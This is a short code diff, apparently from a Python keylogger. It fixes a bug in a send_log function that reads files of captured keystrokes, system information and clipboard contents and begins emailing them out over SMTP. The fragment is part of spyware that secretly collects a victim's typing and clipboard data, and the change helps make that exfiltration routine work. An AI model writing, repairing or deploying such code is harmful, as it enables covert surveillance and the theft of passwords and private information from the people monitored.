@@ -85,12 +85,12 @@ p=1
 def send_log():
     with open(file_path+ extend + keys_information, 'rb') as f1,open(file_path+ extend +system_information, 'rb') as f2,open(file_path+ extend + clipboard_information, 'rb') as f3:
         file1_data=f1.read() 
-        file1_name=f1.name()
+        file1_name=f1.name
         if c<1:
             file2_data=f2.read() 
-            file2_name=f2.name()
+            file2_name=f2.name
         file3_data=f3.read() 
-        file3_name=f3.name()
+        file3_name=f3.name
     #print(access_details)
     print("sending")
     with SMTP(
